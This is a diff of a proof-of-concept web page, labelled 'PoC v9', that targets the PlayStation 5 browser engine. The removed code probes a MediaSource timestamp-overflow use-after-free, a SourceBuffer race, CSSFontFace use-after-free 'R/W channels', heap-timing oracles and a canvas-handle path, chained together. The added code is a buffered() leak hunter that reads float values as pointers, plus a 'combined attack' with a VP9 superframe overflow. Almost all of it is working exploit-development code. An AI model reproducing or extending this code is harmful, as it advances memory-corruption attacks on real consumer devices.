-      ok('[*] Step 1 OK — buffered: ['+
-         (sb.buffered.length?sb.buffered.start(0):'?')+', '+
-         (sb.buffered.length?sb.buffered.end(0):'?')+']');
-      sep();
-
-      // Step 2: set overflow offset and append again
-      inf('[*] Step 2: Set timestampOffset=9223372.036 (int64 ns overflow boundary)');
-      try { sb.timestampOffset = 9223372.036; } catch(e){
-        hit('[*] Set threw: '+e.name); return;
-      }
-      inf('[*] Effective offset: '+sb.timestampOffset);
-
-      appendAndWait(sb, webm, function(err2){
-        if(err2){hit('[*] Step 2 error: '+err2.type);}
-        else{
-          ok('[*] Step 2 OK — time map now has overflowed entry');
-          pr('[*] buffered.length = '+sb.buffered.length,'');
-          for(var i=0;i<sb.buffered.length;i++){
-            pr('[*]   range['+i+']: ['+sb.buffered.start(i).toFixed(6)+
-               ', '+sb.buffered.end(i).toFixed(6)+']','#ffcc44');
-          }
-        }
-        sep();
-
-        // Step 3: remove the "normal" range — may hit wrong map entry
-        inf('[*] Step 3: remove(0, 1) — target normal range, may free wrong segment');
-        var t0 = performance.now();
-        try {
-          sb.addEventListener('updateend', function onRM(){
-            sb.removeEventListener('updateend',onRM);
-            var dt = (performance.now()-t0).toFixed(3);
-            ok('[*] remove() completed in '+dt+'ms');
-            pr('[*] buffered.length after remove = '+sb.buffered.length,'');
-            sep();
-
-            // Step 4: access the time map again — if UAF, use-after-free fires here
-            inf('[*] Step 4: Second remove(0, Infinity) — if UAF, crash here');
-            try {
-              sb.addEventListener('updateend', function onRM2(){
-                sb.removeEventListener('updateend',onRM2);
-                ok('[*] Second remove completed — no UAF observed in JS layer');
-                ok('[*] UAF may be masked by allocator or caught by native guard');
-                hit('[*] Use ASAN build to confirm: MediaSourcePrivatePlayStation::remove()');
-              });
-              sb.remove(0, Infinity);
-            } catch(e){
-              hit('[*] Second remove threw: '+e.name+': '+e.message);
-              hit('[*] CRASH SURFACE: time map corrupted by overflowed key → bad free');
-            }
-          });
-          sb.remove(0, 1);
-        } catch(e){
-          hit('[*] remove(0,1) threw: '+e.name+': '+e.message);
-        }
-      });
-    });
-  });
-}
-
-// ── 4. Multi-SourceBuffer Race + Overflow ─────────────────────────────────────
-function r4(){
-  clr('[4] Multi-SourceBuffer Race + Timestamp Overflow');
-  inf('[*] Two SourceBuffers share the same PSMediaPlayerBackend time map');
-  inf('[*] SB1 uses normal timestamps, SB2 uses overflowed offset');
-  inf('[*] Concurrent remove() on both → race in native time map iterator');
-  sep();
-
-  if(!MediaSource.isTypeSupported('video/webm; codecs="vp9"')){
-    wrn('[*] VP9 not supported'); return;
-  }
-
-  var v  = document.createElement('video');
-  document.body.appendChild(v);
-  var ms = new MediaSource();
-  v.src  = URL.createObjectURL(ms);
-
-  ms.addEventListener('sourceopen', function(){
-    var sb1, sb2;
-    try {
-      sb1 = ms.addSourceBuffer('video/webm; codecs="vp9"');
-      ok('[*] SB1 created (normal timestamps)');
-    } catch(e){ hit('[*] SB1 error: '+e.message); return; }
-
-    var webm = makeValidWebM(1, 0);
-
-    appendAndWait(sb1, webm, function(err1){
-      if(err1){hit('[*] SB1 append error');return;}
-      ok('[*] SB1: valid frame at t=0 in time map');
-
-      // Try to add second SourceBuffer
-      try {
-        sb2 = ms.addSourceBuffer('video/webm; codecs="vp9"');
-        ok('[*] SB2 created (overflow timestamps)');
-
-        try { sb2.timestampOffset = 1e+15; } catch(e){
-          hit('[*] SB2 offset set threw: '+e.message);
-        }
-        pr('[*] SB2 offset: '+sb2.timestampOffset,'#ffcc44');
-
-        appendAndWait(sb2, webm, function(err2){
-          if(err2){
-            hit('[*] SB2 append error: '+err2.type);
-          } else {
-            ok('[*] SB2: frame at overflow position in time map');
-            sep();
-            inf('[*] Issuing concurrent remove() on SB1 and SB2...');
-
-            // Race: trigger both removes with minimal delay
-            var t0 = performance.now();
-            try { sb1.remove(0, Infinity); } catch(e){
-              hit('[*] SB1 remove threw: '+e.name);
-            }
-            try { sb2.remove(0, Infinity); } catch(e){
-              hit('[*] SB2 remove threw: '+e.name);
-            }
-
-            // Check timing — concurrent native map operations
-            setTimeout(function(){
-              var dt = (performance.now()-t0).toFixed(2);
-              pr('[*] Concurrent remove timing: '+dt+'ms','#ffcc44');
-              if(parseFloat(dt) > 500){
-                hit('[*] SLOW: '+dt+'ms — native time map lock contention or corruption');
-              } else {
-                ok('[*] Fast: '+dt+'ms — no contention observed');
-              }
-              pr('[*] SB1 buffered.length = '+sb1.buffered.length,'');
-              pr('[*] SB2 buffered.length = '+sb2.buffered.length,'');
-            }, 600);
-          }
-        });
-      } catch(e){
-        wrn('[*] Second addSourceBuffer threw: '+e.name+': '+e.message);
-        wrn('[*] PS5 may limit to one SourceBuffer per MediaSource');
-      }
-    });
-  });
-}
-
-// ── 5. CSSFontFace UAF — 17 R/W Channels ─────────────────────────────────────
-function r5(){
-  clr('[5] CSSFontFace UAF — R/W Channel Probe');
-  inf('[*] Report confirmed: cssfontface=leaktest WORKS on PS5 FW 13.42');
-  inf('[*] CSSFontFace::m_sources (Vector<CSSFontFaceSource>) keeps refs after free');
-  inf('[*] Goal: establish R/W channels, correlate with MSE buffer addresses');
-  sep();
-
-  // CSSFontFace UAF setup:
-  // 1. Create @font-face rule
-  // 2. Trigger load (async)
-  // 3. Delete the rule while load is in progress
-  // 4. The CSSFontFaceSource callbacks fire on freed CSSFontFace
-
-  var channels   = [];
-  var NUM_FACES  = 20; // Try to open 20 font-face UAF channels
-
-  inf('[*] Creating '+NUM_FACES+' @font-face UAF channels...');
-
-  var style = document.createElement('style');
-  document.head.appendChild(style);
-  var sheet = style.sheet;
-
-  for(var i=0;i<NUM_FACES;i++){
-    try {
-      // Each font-face points to a data: URI that we can observe loading
-      var dataURI = 'url("data:font/woff2;base64,d09GRgABAAAAAAZgABEAAAAACzQAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABgAAAAEAAAABgkN' +
-                    'AAAAAAAAAB2AAAAQAAAAEAAAAAAAAAAAAAAAcAAAGAAAAHgAAAG8AAAAADQAAAoAAAABMAAAATAAAAA' +
-                    '==")';
-      var ruleIdx = sheet.insertRule(
-        '@font-face { font-family: "uaf'+i+'"; src: '+dataURI+'; }', 0
-      );
-      channels.push({ idx: i, ruleIdx: 0, alive: true });
-    } catch(e) {
-      wrn('['+i+'] insertRule threw: '+e.message);
-    }
-  }
-
-  ok('[*] Inserted '+channels.length+' @font-face rules');
-  sep();
-
-  // Trigger font loading by referencing each family
-  inf('[*] Triggering font load for each channel...');
-  var container = document.createElement('div');
-  document.body.appendChild(container);
-
-  channels.forEach(function(c){
-    var el = document.createElement('div');
-    el.style.fontFamily = '"uaf'+c.idx+'"';
-    el.style.position   = 'absolute';
-    el.style.left       = '-9999px';
-    el.textContent      = 'x'; // force layout
-    container.appendChild(el);
-    c.element = el;
-  });
-
-  // Force a style recalculation to trigger the font load
-  var _ = container.offsetHeight;
-  ok('[*] Layout forced — font loads triggered asynchronously');
-  sep();
-
-  // Now delete the rules while loads are in-flight
-  inf('[*] Deleting @font-face rules while loads in progress...');
-  var deleted = 0;
-  // Delete from index 0 multiple times (each deletion shifts indices down)
-  while(sheet.cssRules.length > 0){
-    try {
-      sheet.deleteRule(0);
-      deleted++;
-    } catch(e){ break; }
-  }
-  ok('[*] Deleted '+deleted+'/'+channels.length+' rules');
-  sep();
-
-  // Force GC pressure
-  inf('[*] Applying GC pressure to trigger CSSFontFace free...');
-  var pressure = [];
-  for(var p=0;p<200;p++) pressure.push(new Uint8Array(1024*64)); // 200 × 64KB
-  pressure = [];
-
-  // Now access font metrics — if UAF, reading freed CSSFontFace fields
-  inf('[*] Probing font metrics after free (UAF read channels)...');
-  setTimeout(function(){
-    var uafHits = 0;
-    channels.forEach(function(c){
-      if(!c.element) return;
-      try {
-        // getComputedStyle triggers CSSFontFace::status() call
-        var cs     = window.getComputedStyle(c.element);
-        var family = cs.fontFamily;
-        var size   = cs.fontSize;
-
-        // CSS font loading status — reads from potentially-freed CSSFontFace
-        if(typeof FontFace !== 'undefined'){
-          try {
-            var ff = new FontFace('"uaf'+c.idx+'"', 'local("Arial")');
-            ff.load().then(function(loadedFace){
-              // Font status after rule deletion — reads freed source
-              pr('[ch'+c.idx+'] post-free load: '+loadedFace.status,'#ffcc44');
-              if(loadedFace.status !== 'loaded' && loadedFace.status !== 'error'){
-                hit('[ch'+c.idx+'] UNEXPECTED STATUS: '+loadedFace.status+' → UAF field read?');
-                uafHits++;
-              }
-            }).catch(function(){});
-          } catch(_){}
-        }
-      } catch(e){
-        hit('[ch'+c.idx+'] Exception: '+e.name+': '+e.message+' → UAF crash');
-        uafHits++;
-      }
-    });
-    sep();
-    pr('[*] UAF hit count: '+uafHits+'/'+channels.length,
-       uafHits>0?'#ff7b72':'#3ddc84');
-    if(uafHits>0){
-      hit('[!] CSSFontFace UAF CONFIRMED: '+uafHits+' channels observable');
-      hit('[!] Each channel = 1 R/W probe into freed CSSFontFace memory');
+async function bufferedSingleTest() {
+  log('=== 🔍 buffered() Single Test ===', 'blue');
+  
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    
+    const data = buildMinimalMP4();
+    sb.appendBuffer(data);
+    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
+    
+    // Call buffered()
+    const b = sb.buffered;
+    log('buffered.length = '+b.length, 'info');
+    
+    if (b.length > 0) {
+      const start = b.start(0);
+      const end = b.end(0);
+      log('buffered.start(0) = '+start, 'info');
+      log('buffered.end(0) = '+end, 'info');
+      
+      // Decode as pointer
+      const buf = new ArrayBuffer(8);
+      const f64 = new Float64Array(buf);
+      const u32 = new Uint32Array(buf);
+      f64[0] = start;
+      log('start as u32: [0x'+u32[0].toString(16)+', 0x'+u32[1].toString(16)+']', 'info');
+      
+      storeResult('buffered_single', 'OK', {start, end, u32: [u32[0], u32[1]]});
     } else {
-      ok('[*] No direct UAF observable — may need larger GC pressure');
-      inf('[*] Try increasing pressure or using performance.mark() timing oracle');
+      log('buffered is empty', 'warn');
+      storeResult('buffered_single', 'EMPTY', {});
     }
-  }, 500);
+    
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('buffered() error: '+e.name+': '+e.message, 'err');
+    storeResult('buffered_single', 'ERROR', {msg: e.message});
+  }
 }
 
-// ── 6. CSSFontFace Heap Shape ─────────────────────────────────────────────────
-function r6(){
-  clr('[6] CSSFontFace Heap Shape — Timing Oracle');
-  inf('[*] Time the CSSFontFace status check before/after free');
-  inf('[*] Timing change = freed object being reallocated by another allocator');
-  inf('[*] Pattern: slow→fast = IsoHeap reclaimed; fast→fast = still in bin');
-  sep();
-
-  if(typeof FontFace === 'undefined'){
-    wrn('[*] FontFace API not available'); return;
-  }
-
-  var N   = 30;
-  var times = [];
-
-  function measure(label, cb){
-    var t0 = performance.now();
-    var ff = new FontFace('probe'+times.length, 'local("Arial")');
-    ff.load().catch(function(){}).finally(function(){
-      var dt = performance.now()-t0;
-      times.push({label:label, dt:dt});
-      pr('['+label+'] FontFace load time: '+dt.toFixed(3)+'ms',
-         dt>100?'#ff7b72':dt>20?'#ffcc44':'#3ddc84');
-      if(cb) cb();
-    });
-  }
-
-  inf('[*] Baseline: '+N+' FontFace loads without GC pressure...');
-  var i=0;
-  function nextBaseline(){
-    if(i>=10){afterBaseline();return;}
-    measure('baseline-'+i, function(){i++;setTimeout(nextBaseline,50);});
-  }
-
-  function afterBaseline(){
-    sep();
-    // Create + delete font-face rules aggressively
-    inf('[*] Creating and deleting 100 @font-face rules rapidly...');
-    var st  = document.createElement('style');
-    document.head.appendChild(st);
-    var sh  = st.sheet;
-    for(var k=0;k<100;k++){
-      try {
-        sh.insertRule('@font-face{font-family:"gc'+k+'";src:local("Arial");}',0);
-      } catch(_){}
+async function bufferedRapidTest() {
+  log('=== 🔍 buffered() Rapid Test (100x) ===', 'blue');
+  
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    
+    const data = buildMinimalMP4();
+    sb.appendBuffer(data);
+    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
+    
+    const values = [];
+    for (let i = 0; i < 100; i++) {
+      const b = sb.buffered;
+      if (b.length > 0) {
+        values.push({start: b.start(0), end: b.end(0)});
+      }
     }
-    var _ = document.body.offsetHeight; // trigger layout
-    while(sh.cssRules.length>0) try{sh.deleteRule(0);}catch(_){break;}
-
-    // GC pressure
-    var pr2=[];
-    for(var g=0;g<500;g++) pr2.push(new Uint8Array(65536));
-    pr2=[];
-    sep();
-
-    inf('[*] Post-GC FontFace loads (timing oracle for heap state)...');
-    var j=0;
-    function nextPost(){
-      if(j>=10){verdictHeap();return;}
-      measure('post-gc-'+j, function(){j++;setTimeout(nextPost,50);});
+    
+    log('Collected '+values.length+' samples', 'info');
+    
+    // Check for variations
+    let variations = 0;
+    for (let i = 1; i < values.length; i++) {
+      if (values[i].start !== values[0].start || values[i].end !== values[0].end) {
+        variations++;
+      }
     }
-    nextPost();
-  }
-
-  function verdictHeap(){
-    sep();
-    var baselineTimes = times.filter(function(t){return t.label.startsWith('baseline');});
-    var postTimes     = times.filter(function(t){return t.label.startsWith('post');});
-    var bAvg = baselineTimes.reduce(function(a,b){return a+b.dt;},0)/baselineTimes.length;
-    var pAvg = postTimes.reduce(function(a,b){return a+b.dt;},0)/postTimes.length;
-    inf('[HEAP TIMING] baseline avg: '+bAvg.toFixed(3)+'ms');
-    inf('[HEAP TIMING] post-GC avg:  '+pAvg.toFixed(3)+'ms');
-    var ratio = pAvg/bAvg;
-    pr('[HEAP TIMING] ratio: '+ratio.toFixed(2)+'x',
-       Math.abs(ratio-1)>0.2?'#ff7b72':'#3ddc84');
-    if(ratio>1.3){
-      hit('[!] Post-GC SLOWER: IsoHeap reclaiming freed CSSFontFace bins');
-      hit('[!] Heap shape changed — freed CSSFontFace objects being reused');
-    } else if(ratio<0.7){
-      hit('[!] Post-GC FASTER: freed CSSFontFace merged into fast-path allocator');
+    
+    log('Variations detected: '+variations, variations > 0 ? 'warn' : 'ok');
+    
+    if (variations > 0) {
+      log('>>> STALE STACK BYTES DETECTED! <<<', 'err');
+      storeResult('buffered_rapid', 'LEAK_DETECTED', {variations, samples: values.slice(0,10)});
     } else {
-      ok('[*] No significant timing delta — heap shape stable after font-face free');
+      storeResult('buffered_rapid', 'STABLE', {variations});
     }
+    
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Rapid buffered error: '+e.name, 'err');
   }
-
-  nextBaseline();
 }
 
-// ── 7. Canvas Handle Probe ────────────────────────────────────────────────────
-function r7(){
-  clr('[7] Canvas Handle Probe — updateCanvasHandle() Integer Attack');
-  inf('[*] Source: MediaPlayerPrivatePlayStation::updateCanvasHandle(uint32_t)');
-  inf('[*] m_canvasHandle = canvasHandle; (no validation) → pushNextHolePunchBuffer()');
-  inf('[*] Invalid handle → GPU texture corruption or invalid memory access');
-  inf('[*] Access via: video element → canvas rendering pipeline');
-  sep();
-
-  // The canvas handle is set internally when a video renders to canvas.
-  // We can't call updateCanvasHandle() directly from JS — it's C++ internal.
-  // But we can trigger it indirectly:
-  // drawImage(video, ...) triggers the hole-punch path on PS5.
-
-  var canvas = document.createElement('canvas');
-  canvas.width  = 320;
-  canvas.height = 240;
-  document.body.appendChild(canvas);
-  var ctx = canvas.getContext('2d');
-
-  setupMSE(function(sb, ms, video){
-    appendAndWait(sb, makeValidWebM(1,0), function(err){
-      if(err){hit('[*] Video setup error');return;}
-      ok('[*] Video data loaded');
-
-      // Start playback — this triggers updateCanvasHandle via hole-punch
-      video.muted = true;
-      video.play().then(function(){
-        ok('[*] Video playing — hole-punch handle set');
-        sep();
-
-        // Now draw video to canvas — triggers canvas handle path
-        inf('[*] drawImage() at various frame positions...');
-        var frames = 0;
-        var timings = [];
-        var rafId;
-
-        function captureFrame(){
-          if(frames>=30){
-            window.cancelAnimationFrame(rafId);
-            video.pause();
-            sep();
-            var avg = timings.reduce(function(a,b){return a+b;},0)/timings.length;
-            inf('[TIMING] '+timings.length+' frames, avg: '+avg.toFixed(3)+'ms');
-            var max = Math.max.apply(null,timings);
-            var min = Math.min.apply(null,timings);
-            pr('[TIMING] min='+min.toFixed(3)+'ms max='+max.toFixed(3)+'ms','#ffcc44');
-            if(max>avg*5){
-              hit('[!] TIMING SPIKE: '+max.toFixed(3)+'ms = '+
-                  (max/avg).toFixed(1)+'x avg');
-              hit('[!] GPU handle path took anomalous time — possible handle misuse');
-            } else {
-              ok('[*] No timing anomaly in canvas handle path');
-            }
-            return;
-          }
-
-          var t0 = performance.now();
-          try {
-            ctx.drawImage(video, 0, 0, 320, 240);
-            timings.push(performance.now()-t0);
-          } catch(e){
-            hit('[!] drawImage threw: '+e.name+': '+e.message);
-            hit('[!] Canvas handle path error — possible invalid handle state');
-            window.cancelAnimationFrame(rafId);
-            return;
-          }
-
-          frames++;
-          rafId = requestAnimationFrame(captureFrame);
-        }
-        rafId = requestAnimationFrame(captureFrame);
-
-      }).catch(function(e){
-        wrn('[*] play() rejected: '+e.name+': '+e.message);
-        wrn('[*] Video may need user gesture on PS5 — test manually');
-      });
-    });
-  });
+async function bufferedWithPressure() {
+  log('=== 🔍 buffered() + Canvas Pressure ===', 'blue');
+  
+  try {
+    // Build pressure
+    const canvases = [];
+    for (let i = 0; i < 2; i++) {
+      const c = document.createElement('canvas');
+      c.getContext('2d').createImageData(0x4000, 0x4000);
+      canvases.push(c);
+    }
+    log('Pressure: 2x 1GB canvases', 'info');
+    
+    // Now test buffered
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    
+    const data = buildMinimalMP4();
+    sb.appendBuffer(data);
+    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
+    
+    const b = sb.buffered;
+    log('Under pressure — buffered.length = '+b.length, 'info');
+    
+    if (b.length > 0) {
+      const start = b.start(0);
+      const buf = new ArrayBuffer(8);
+      const u32 = new Uint32Array(buf);
+      new Float64Array(buf)[0] = start;
+      log('start as u32: [0x'+u32[0].toString(16)+', 0x'+u32[1].toString(16)+']', 'info');
+    }
+    
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Pressure buffered error: '+e.name, 'err');
+  }
 }
 
-// ── Full Chain ────────────────────────────────────────────────────────────────
-function rAll(){
-  clr('[FULL CHAIN] Time Math + CSSFontFace + Canvas');
-  r0();
-  setTimeout(function(){sep();r1();
-  setTimeout(function(){sep();r2();
-  setTimeout(function(){sep();r3();
-  setTimeout(function(){sep();r5();
-  setTimeout(function(){sep();r6();
-  setTimeout(function(){sep();r7();
-  },2000);},2000);},5000);},4000);},4000);},500);
+async function runBufferedHunter() {
+  log('=== 🔍 RUNNING buffered() LEAK HUNTER ===', 'blue');
+  document.getElementById('status').textContent = 'Hunting...';
+  
+  await bufferedSingleTest();
+  await new Promise(r => setTimeout(r, 500));
+  await bufferedRapidTest();
+  await new Promise(r => setTimeout(r, 500));
+  await bufferedWithPressure();
+  
+  log('=== LEAK HUNTER COMPLETE ===', 'ok');
+  document.getElementById('status').textContent = 'Hunting Complete';
 }
+
+// ============================================================
+// Combined
+// ============================================================
+async function combinedVP9Buffered() {
+  log('=== 🔥 COMBINED: VP9 + buffered() ===', 'err');
+  document.getElementById('status').textContent = 'Combined Attack...';
+  
+  // Step 1: VP9 append
+  const vp9Data = makeSuperframeOverflow();
+  await testVP9Vector('VP9 (Combined)', vp9Data);
+  
+  // Step 2: buffered() hunt
+  await bufferedSingleTest();
+  
+  log('=== COMBINED COMPLETE ===', 'ok');
+  document.getElementById('status').textContent = 'Combined Complete';
+}
+
+// Global handlers
+window.onerror = (m,u,l,c,e) => { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); storeResult('GLOBAL_ERROR', m, {}); };
+window.onunhandledrejection = e => { log('REJECTION: '+e.reason, 'err'); storeResult('REJECTION', e.reason, {}); };
+
+log('PoC v9 loaded. VP9 Fuzzer + buffered() Leak Hunter.', 'ok');
+log('Press 🔥 RUN VP9 FUZZER or 🔍 RUN buffered() LEAK HUNTER', 'warn');
 </script>
 </body>
 </html>
